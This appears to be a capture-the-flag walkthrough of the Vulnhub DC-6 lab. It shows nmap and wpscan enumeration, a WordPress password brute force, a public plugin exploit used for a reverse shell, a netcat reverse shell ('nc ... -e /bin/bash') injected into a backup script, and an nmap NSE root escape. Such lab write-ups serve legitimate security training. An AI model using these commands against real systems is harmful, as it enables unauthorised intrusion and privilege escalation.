<h1>DC-6 Write-up</h1>

<h2>NMAP</h2>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-wordpress-users: 
| Username found: admin
| Username found: graham
| Username found: mark
| Username found: sarah
| Username found: jens
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

```

Found Username's from nmap scan:

Add "192.168.56.51	wordy" in /etc/hosts file to access web  #Change IP to your machine's IP 

**CLUE FROM AUTHOR  :**

```
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

**WPSCAN :**

User Enumeration:

```wpscan --url "http://wordy" -e u ```

Password Attack :

```wpscan -U wp-users -P passwords.txt --url "http://wordy/"```

```
Username : mark 
Password : helpdesk01
```
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-6/images/wpbrute.png)

<h3>Exploiting Active Monitor Plugin :</h3> 

Exploit : https://www.exploit-db.com/exploits/45274

* download this exploit in your pc 
* Edit the url, Change localhost:8000 to wordy and remove "-nlvp" from the nc command and lastly also update the rev shell IP 
* start listner at port 9999 (nc -lvp 9999) 
* start your pythonhttpserver,open that file, Click on Submit Request to get the shell

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-6/images/wwwshell.png)


<h3>Privilege Escalation :</h3>

Found txt file in mark's home directory contain's password user "graham"

```
username : graham
password : GSo7isUM1D4
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-6/images/grahamuser.png)

Futher Enumeration 

```sudo -l```

I can run /home/jens/backups.sh as jens user 

* add rev shell code in /home/jens/backups.sh (nc 192.168.56.1 443 -e /bin/bash)

Start Listener in your machine (nc -lvp 443)
* sudo -u jens /home/jens/backups.sh

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-6/images/jensshell.png)

<h3>ROOT PRIV ESC:</h3>

```
sudo -l
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-6/images/rootflag%20and%20privesc.png)
